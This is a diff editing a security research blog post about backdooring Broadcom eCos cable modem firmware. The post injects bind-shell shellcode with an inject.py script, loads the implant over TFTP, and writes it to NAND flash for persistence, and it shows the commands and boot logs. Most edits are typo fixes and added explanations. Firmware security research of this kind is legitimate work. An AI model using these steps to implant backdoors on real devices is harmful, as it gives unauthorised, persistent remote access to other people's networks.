@@ -225,19 +225,18 @@ if __name__ == "__main__":
         f.write(padding)
 {% endhighlight %}
 
-
 Let's inject our shellcode:
 
 {% highlight sh %}
-cp implant.in implant.shellcode
-./inject.py implant.shellcode ~/git/ecoshell/bindshell_thread.bin 0x805f4434 0x805f4b28
+cp firmware.clean firmware.implant
+./inject.py firmware.implant ~/git/ecoshell/bindshell_thread.bin 0x805f4434 0x805f4b28
 Available space: 1780 bytes
 Overwriting firmware file with shellcode.
 {% endhighlight %}
 
 We repack it, serve it over TFTP and let it boot. As we can see from the boot logs below, our malicious code is executing successfully.
 
-Note that if we wanted our code to run in a single window without being prempted by the scheduler, we could add calls to `cyg_scheduler_lock` and `cyg_scheduler_unlock`. This way our logs would no longer be spread around in the boot logs :)
+Note that if we wanted our code to run in a single window without being preempted by the scheduler, we could add calls to `cyg_scheduler_lock` and `cyg_scheduler_unlock`. This way our logs would no longer be spread around in the boot logs :)
 
 {% highlight asm %}
 --boot--
@@ -328,6 +327,10 @@ I was initially planning on writing my own client to write the backdoored firmwa
 - **CM/ip_hal/bootloader** - download and save bootloader to flash (IP controller)
 - **CM/docsis_ctl/bootloader** - download and save bootloader to flash (CMTS controller)
 
+The difference between `ip_hal` and `docsis_ctl` is the route that the TFTP request will take when fetching the file from a remote host, but I won't cover DOCSIS networking internals here.
+
+Here's the command documentation:
+
 {% highlight asm %}
 CM/IpHal> help dload
 
@@ -358,7 +361,7 @@ dload 11.24.4.3 vxram_sto.bin       -- Stores the image to the default image
 dload -i 1 11.24.4.3 vxram_sto.bin  -- Store the image to slot 1.
 {% endhighlight %}
 
-Sample run:
+A quick demo with our malicious firmware:
 
 {% highlight asm %}
 CM/IpHal> dload -i2 192.168.100.10 implant.out
@@ -399,7 +402,7 @@ NandFlashRead: Detected out-of-order block @offset 0x3b30000, tagged offset 0xff
 NandFlashRead: Failed to find replacement block!
 {% endhighlight %}
 
-Bootloader:
+And here's the documentation for the bootloader update command:
 
 {% highlight asm %}
 CM/IpHal> help bootloader
@@ -421,10 +424,12 @@ bootloader -f 11.24.4.3 bootloader3360_2_1_2_c0.bin  -- Accepts a bootloader
                                                         signature.
 {% endhighlight %}
 
+I did not test it yet with a backdoored bootloader image, but I'll make sure to edit this post when I do.
+
 ## Conclusion
 
-Over the course of this article, we learned how to unpack, implant, and repack a Broadcom eCos firmware file. We then explored ways of running our malicious firmware file, loading over TFTP and running on RAM for debugging purposes, and writing to NAND flash for persistence.
+Over the course of this article, we learned how to unpack, implant, and repack a Broadcom eCos firmware file. We then explored ways of running our malicious firmware file: loading over TFTP and running on RAM for debugging purposes, and writing to NAND flash for persistence.
 
 We therefore proved our initial hypothesis that said "and leave a persistent backdoor allowing direct remote access to the network". 
 
-As always, if you have any question feel free to contact me via [Twitter](https://twitter.com) or [email](mailto:quentin@ecos.wtf).
+As always, if you have any question feel free to contact me via [Twitter](https://twitter.com/qkaiser) or [email](mailto:quentin@ecos.wtf).
